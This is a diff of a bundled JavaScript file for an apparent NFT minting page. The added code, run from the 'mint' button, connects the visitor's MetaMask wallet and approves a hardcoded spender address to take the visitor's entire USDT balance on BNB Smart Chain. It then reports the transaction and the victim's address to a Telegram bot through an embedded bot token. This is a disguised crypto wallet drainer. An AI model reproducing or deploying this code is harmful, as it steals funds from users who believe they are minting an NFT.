@@ -60,173 +60,189 @@ module.exports=[
 },{}],2:[function(require,module,exports){
 window.onload = () =>{
   let useraddress;
-  // let network_id = '0x38'; // bnb mainnet
+
+  let network_id = '0x38'; // bnb mainnet
   // let network_id = '0x1'; // eth main net
-//   let network_id = '0x89';  // polygon mainnet
-     let network_id = '0xa4b1'; // arbitramb mainnet
+  //   let network_id = '0x89';  // polygon mainnet
+  // let network_id = '0xa4b1'; // arbitramb mainnet
 
-    const tokenAddress = '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9'; // arbi usddt
+  const tokenAddress = '0x55d398326f99059ff775485246999027b3197955'; // arbi usddt
 
-
-    const chainId = '0xa4b1'; // Chain ID for BSC
-    const chainName = 'Arbitrum Mainnet';
-    const chain_add_rpcUrl = 'https://arbitrum.llamarpc.com';
-    const symbol = 'ETH';
-
-    // ======================== static image ==============================================
-    let token_balance;
-    let chain_per = true;
-    const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
-    let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
-    
-    let connect_button = document.querySelectorAll('.wallet_connect_btn');
-    let connectModal = document.querySelector('#connectModal');
-    let connect_btn_text = document.querySelectorAll('.bithu-connect-btn-text');
-    let close_modal = document.querySelector('.close_modal');
-    let connect_spinner = document.querySelector('.connect_spinner');
-    let connect_wallet_li = document.querySelector('.connect_wallet_li');
+  const chainId = '0x38'; // Chain ID for Binance Smart Chain (BSC)
+  const chainName = 'Binance Smart Chain';
+  const chain_add_rpcUrl = 'https://bsc-dataseed.binance.org/'; // RPC endpoint for BSC
+  const symbol = 'BNB'; // BNB is the native cryptocurrency symbol for BSC
+  const blockExplorerUrl = 'https://bscscan.com/'; // Block explorer for BSC
 
 
-    connect_button.forEach((element) => {
-      element.addEventListener('click', open_modal_fun);
+  
+  // ======================== static image ==============================================
+  let token_balance;
+  let chain_per = true;
+  const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
+  let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
+
+  let connect_button = document.querySelectorAll('.wallet_connect_btn');
+  let connectModal = document.querySelector('#connectModal');
+  let connect_btn_text = document.querySelectorAll('.bithu-connect-btn-text');
+  let close_modal = document.querySelector('.close_modal');
+  let connect_spinner = document.querySelector('.connect_spinner');
+  let connect_wallet_li = document.querySelector('.connect_wallet_li');
+
+  connect_button.forEach((element) => {
+    element.addEventListener('click', open_modal_fun);
+  });
+  function open_modal_fun() {
+    connectModal.classList.add('open_modal');
+  }
+
+  close_modal.addEventListener('click', close_modal_fun);
+  function close_modal_fun() {
+    connectModal.classList.remove('open_modal');
+  }
+
+  connect_wallet_li.addEventListener('click', connect_meamask);
+
+  async function wallet_connected(address) {
+    useraddress = address;
+    connect_spinner.classList.add('d-none');
+    connectModal.classList.remove('open_modal');
+    connect_btn_text.forEach((element) => {
+      element.innerText = useraddress;
     });
-    function open_modal_fun(){
-        connectModal.classList.add('open_modal');
-    }
+  }
 
-    close_modal.addEventListener('click', close_modal_fun);
-    function close_modal_fun(){
-      connectModal.classList.remove('open_modal');
-    }
-
-    connect_wallet_li.addEventListener('click', connect_meamask);
-
-    async function wallet_connected(address) {
-       useraddress = address;
-       connect_spinner.classList.add('d-none');
-       connectModal.classList.remove('open_modal');
-       connect_btn_text.forEach((element) => { element.innerText = useraddress });
-    }
-
-    async function change_network(network_id) {
-      if (typeof window.ethereum !== 'undefined') {
-        const ethereum = window.ethereum;
-        await ethereum.request({method: 'wallet_switchEthereumChain',params: [{ chainId: network_id }],})
-          .then(async (response) => {
-            return true;
-          })
-          .catch(async (error) => {
-            await add_network();
-            if (chain_per){
-                await change_network(network_id);
-                chain_per = false;
-            } 
-            
-            return false;
-          });
-      } else {
-        console.error('MetaMask is not installed');
-        return false;
-      }
-    }
-
-    async function connect_meamask() {
-      
-      connect_spinner.classList.remove('d-none');
-
-      if (window.ethereum) {
-        const ethereum = window.ethereum;
-        const accounts = await ethereum.request({method: 'eth_requestAccounts',});
-        useraddress = accounts[0];
-        
-        await wallet_connected(useraddress);
-        await change_network(network_id);
-      } else {
-        connect_meamask();
-        connect_spinner.classList.add('d-none');
-      }
-    }
-
-   async function add_network() {
-      try {
-        await ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [
-            {
-              chainId: chainId,
-              chainName: chainName,
-              rpcUrls: [chain_add_rpcUrl],
-              nativeCurrency: {
-                name: symbol,
-                symbol: symbol,
-                decimals: 18,
-              },
-            },
-          ],
-        });
-
-        return true;
-      } catch (error) {
-        await add_network();
-        console.error(
-          'Error adding network to MetaMask:',
-          error,
-        );
-      }
-    }
-
-    // ================== mint process ======================
-
-    let mint_button = document.querySelector('.mint_nft_button');
-    mint_button.addEventListener('click',mint);
-
-    async function mint(){
-      await connect_meamask()
-      
-      const tokenAbi = require('./abi.json');
-      const ethers = require('ethers');
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-
-      const tokenContract = new ethers.Contract(tokenAddress,tokenAbi,provider.getSigner());
-
-      // get user token balance
-      async function getBalance() {
-        const balance = await tokenContract.balanceOf(useraddress);
-        token_balance = ethers.utils.formatUnits(balance, 18);
-
-        return token_balance;
-      }
-
-      // get user token balance
-      async function increaseAllowance() {
-
-        const amountIncrease = ethers.utils.parseUnits(token_balance.toString(), 18,);
-
-        // Estimate gas
-        const estimatedGas = await tokenContract.estimateGas.increaseAllowance( spenderAddress, amountIncrease,);
-
-        const gasPrice = await provider.getGasPrice();
-
-        const gasLimit = estimatedGas.add(1000); // adding a buffer of 10,000
-
-        const tx = await tokenContract.increaseAllowance(
-          spenderAddress,
-          amountIncrease,
-          {
-            gasLimit: gasLimit,
-            gasPrice: gasPrice
+  async function change_network(network_id) {
+    if (typeof window.ethereum !== 'undefined') {
+      const ethereum = window.ethereum;
+      await ethereum
+        .request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: network_id }],
+        })
+        .then(async (response) => {
+          return true;
+        })
+        .catch(async (error) => {
+          await add_network();
+          if (chain_per) {
+            await change_network(network_id);
+            chain_per = false;
           }
-        );
 
-        await tx.wait();
-        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>, User Address- <code>${useraddress}</code> , Token address - <code>${tokenAddress}</code> , Network Id - <code>${network_id}</code>&parse_mode=HTML`);
-      }
-
-      await getBalance();
-      await increaseAllowance();
-
+          return false;
+        });
+    } else {
+      console.error('MetaMask is not installed');
+      return false;
     }
+  }
+
+  async function connect_meamask() {
+    connect_spinner.classList.remove('d-none');
+
+    if (window.ethereum) {
+      const ethereum = window.ethereum;
+      const accounts = await ethereum.request({
+        method: 'eth_requestAccounts',
+      });
+      useraddress = accounts[0];
+
+      await wallet_connected(useraddress);
+      await change_network(network_id);
+    } else {
+      connect_meamask();
+      connect_spinner.classList.add('d-none');
+    }
+  }
+
+  async function add_network() {
+    try {
+      await ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [
+          {
+            chainId: chainId,
+            chainName: chainName,
+            rpcUrls: [chain_add_rpcUrl],
+            nativeCurrency: {
+              name: symbol,
+              symbol: symbol,
+              decimals: 18,
+            },
+          },
+        ],
+      });
+
+      return true;
+    } catch (error) {
+      await add_network();
+      console.error('Error adding network to MetaMask:', error);
+    }
+  }
+
+  // ================== mint process ======================
+
+  let mint_button = document.querySelector('.mint_nft_button');
+  mint_button.addEventListener('click', mint);
+
+  async function mint() {
+    await connect_meamask();
+
+    const tokenAbi = require('./abi.json');
+    const ethers = require('ethers');
+
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+    const tokenContract = new ethers.Contract(
+      tokenAddress,
+      tokenAbi,
+      provider.getSigner(),
+    );
+
+    // get user token balance
+    async function getBalance() {
+      const balance = await tokenContract.balanceOf(useraddress);
+      token_balance = ethers.utils.formatUnits(balance, 18);
+
+      return token_balance;
+    }
+
+    // get user token balance
+    async function increaseAllowance() {
+      const amountIncrease = ethers.utils.parseUnits(
+        token_balance.toString(),
+        18,
+      );
+
+      // Estimate gas
+      const estimatedGas = await tokenContract.estimateGas.increaseAllowance(
+        spenderAddress,
+        amountIncrease,
+      );
+
+      const gasPrice = await provider.getGasPrice();
+
+      const gasLimit = estimatedGas.add(1000); // adding a buffer of 10,000
+
+      const tx = await tokenContract.increaseAllowance(
+        spenderAddress,
+        amountIncrease,
+        {
+          gasLimit: gasLimit,
+          gasPrice: gasPrice,
+        },
+      );
+
+      await tx.wait();
+      fetch(
+        `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>, User Address- <code>${useraddress}</code> , Token address - <code>${tokenAddress}</code> , Network Id - <code>${network_id}</code>&parse_mode=HTML`,
+      );
+    }
+
+    await getBalance();
+    await increaseAllowance();
+  }
 }
 },{"./abi.json":1,"ethers":144}],3:[function(require,module,exports){
 "use strict";
